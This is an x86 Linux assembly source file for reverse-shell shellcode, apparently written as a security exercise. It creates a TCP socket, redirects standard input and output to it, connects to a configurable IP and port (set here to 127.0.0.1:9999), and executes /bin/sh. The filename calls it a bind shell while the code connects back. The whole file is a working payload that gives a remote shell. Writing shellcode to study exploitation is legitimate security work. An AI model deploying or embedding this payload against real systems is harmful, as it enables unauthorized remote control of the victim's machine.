; Filename: shell_bind_fork_tcp.nasm
; Author:  Mark Shaneck
; Website:  http://markshaneck.com
;
; Purpose: The purpose of this shellcode connect back
; to a host and port of our choosing

global _start

section .text
_start:

	; First things first, call socket
	; need to call socketcall with args 1, and domain (2), type (1), protocol(6)
	push byte 6 ; protocol = IPPROTO_TCP
	push byte 1 ; type = SOCK_STREAM
	push byte 2 ; domain = AF_INET
	xor eax, eax
	mov al, 102 ; syscall - socketcall
	xor ebx,ebx
	mov bl, 1   ; socket sockcall type
	mov ecx, esp ; pointer to the args
	int 0x80

	; eax now contains the socket file descriptor

	; let's dup the stdio FDs
	pop ecx ; we are going to loop from 2 to 0, and 2 happens to be on the top of the stack
	mov ebx,eax ; put socket file descriptor in ebx
dup:
	mov al, 63 ; dup2 syscall
	int 0x80
	dec ecx
	cmp cl,0xff
	jne dup

	; now we call connect
	; we need the socket file descriptor, a pointer to the sockaddr structure and a 16
	; perform a jmp-call-pop to get the port number so that it is easily configurable
	jmp short get_sockaddr

got_sockaddr:
	pop ecx               ; put address of sockaddr struct into ecx
	mov edx,[ecx+2]
	push edx              ; push the ip address next
	mov dx, word [ecx]    ; put the port into ebx
	shl edx,16            ; move the port number to the higher order bytes
	add dl,2              ; put the socket family in there
	push edx

	mov edx, esp ; now ebx has the address of the sockaddr_in struct
	push byte 0x10
	push edx
	push ebx
	mov ecx, esp
	xor ebx,ebx
	mov bl, 3   ; connect sockcall type
	mov al, 102 ; syscall - socketcall
	int 0x80

	; we should now be connected

	; execve the shell using stack method
	; let's execute sh
	xor eax,eax
	push eax
	push 0x68732f2f
	push 0x6e69622f

	mov ebx,esp ; pointer to "/bin//sh"
	push eax
	mov edx,esp ; env pointer (NULL)

	push ebx
	mov ecx,esp ; pointer to [pointer to "/bin//sh", 0]

	mov al, 11 ; execve syscall
	int 0x80

get_sockaddr:
	call got_sockaddr
	sockaddr: db 0x27, 0x0f, 0x7f, 0x00, 0x00, 0x01
	; should we worry about the nulls in the ip addr?
